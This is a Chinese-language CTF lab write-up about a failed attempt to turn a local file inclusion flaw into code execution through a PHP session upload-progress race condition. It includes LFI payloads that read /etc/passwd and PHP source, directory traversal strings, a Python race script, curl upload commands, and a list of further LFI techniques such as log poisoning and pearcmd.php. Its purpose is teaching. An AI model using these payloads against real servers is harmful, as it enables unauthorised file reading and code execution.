概述

本文记录了一次CTF靶场的实战经历，涉及LFI（本地文件包含）漏洞和PHP_SESSION_UPLOAD_PROGRESS条件竞争攻击。虽然最终因为配置问题没有成功，但过程中学到了很多。

失败的经验也是经验——知道什么路走不通，比盲目尝试更重要

LFI基础

本地文件包含（LFI）是指应用程序包含服务器上的文件时，没有正确过滤用户输入。

常见利用方式

# 读取系统文件
include.php?file=/etc/passwd
include.php?file=/proc/self/cmdline

# 目录遍历
include.php?file=../../../../etc/passwd

# PHP伪协议（如果没被过滤）
include.php?file=php://filter/convert.base64-encode/resource=config.php

靶场发现

# 访问目标，发现重定向
curl http://target:14302
# => 302 重定向到 /include.php

# 测试LFI
curl "http://target/include.php?file=/etc/passwd"
# => 成功读取，确认存在LFI

# 测试PHP文件包含
curl "http://target/include.php?file=index.php"
# => "文件不存在或不可读" — PHP文件被过滤了

# 测试php://filter
curl "http://target/include.php?file=php://filter/convert.base64-encode/resource=index.php"
# => 被WAF拦截

Session Upload Progress

PHP有一个特性：当上传文件时，如果设置了PHP_SESSION_UPLOAD_PROGRESS字段，PHP会将上传进度写入session文件。

正常流程

1. 客户端发送上传请求，包含 PHP_SESSION_UPLOAD_PROGRESS 字段
2. PHP创建session文件：/tmp/sess_<PHPSESSID>
3. PHP将上传进度写入session文件
4. 上传完成，PHP清理session中的进度数据
5. 客户端可以读取session获取上传进度

攻击思路

1. 在 PHP_SESSION_UPLOAD_PROGRESS 字段写入PHP代码
2. 上传一个大文件（延长进度数据存在的时间）
3. 同时用LFI包含session文件
4. 如果时机正确，就能执行注入的PHP代码

Payload:
PHP_SESSION_UPLOAD_PROGRESS = 
文件: 任意文件（越大越好）

条件竞争原理

这个攻击的核心是条件竞争——需要在进度数据被清理之前读取session文件。

时间线：
|--上传开始--|--进度写入session--|--上传完成--|--清理session数据--|
                            ↑
                    必须在这个窗口内读取!

为什么难？

  • 窗口时间极短（毫秒级）
  • 需要高并发请求才能命中
  • 服务器可能有配置限制
  • session.upload_progress.cleanup = On时，上传完成立即清理

实战踩坑

在这个靶场中，我尝试了多种方法都失败了：

尝试1：多线程并发

import threading

# 线程1：持续上传
def upload():
    requests.post(url, files=big_file, cookies=cookies)

# 线程2：持续读取session
def read_session():
    while True:
        r = requests.get(f"{base}/include.php?file=/tmp/sess_{sid}")
        if "flag" in r.text:
            print("Found!")

# 同时启动
threading.Thread(target=upload).start()
threading.Thread(target=read_session).start()

# 结果：session文件始终为空

尝试2：降低上传速率

# 使用curl的--limit-rate降低上传速度
# 理论上延长进度数据存在的时间
curl --limit-rate 1K -X POST /upload.php \
  -F "PHP_SESSION_UPLOAD_PROGRESS=" \
  -F "file=@/tmp/bigfile.bin"

# 结果：session文件依然为空

尝试3：验证配置

# 最终验证：上传过程中session是否写入数据
# 结论：session.upload_progress.enabled = OFF
# 这个功能根本没开！

失败原因

测试项 结果 说明
LFI漏洞 ✅ 存在 能读取系统文件
Session文件路径 ✅ 可读 /tmp/sess_XXX 可访问
Session内容 ❌ 始终为空 上传进度未写入
upload_progress.enabled ❌ 关闭 功能被禁用

经验教训

1. 先验证，再攻击

我犯的最大错误：没有先验证session.upload_progress是否开启，就盲目跑了十几轮并发脚本。

# 应该第一步就做这个测试
# 上传时检查session文件是否写入数据
# 如果始终为空，说明功能没开，立即换思路

2. 理解配置的重要性

相关PHP配置：

session.upload_progress.enabled = On   # 必须开启
session.upload_progress.cleanup = On   # 上传后清理（默认开启）
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"

3. 其他LFI利用思路

当session upload progress不通时，还有这些方法：

  • 日志投毒：注入代码到access.log/error.log，然后包含日志文件
  • /proc/self/environ：包含进程环境变量
  • /proc/self/fd/：包含文件描述符
  • pearcmd.php：利用PEAR命令写文件
  • php://filter：如果没被过滤，可以读取PHP源码

4. 时间管理

在一条路上卡太久时，应该：

  1. 设定时间限制（比如30分钟）
  2. 如果没进展，立即换思路
  3. 记录已尝试的方法，避免重复
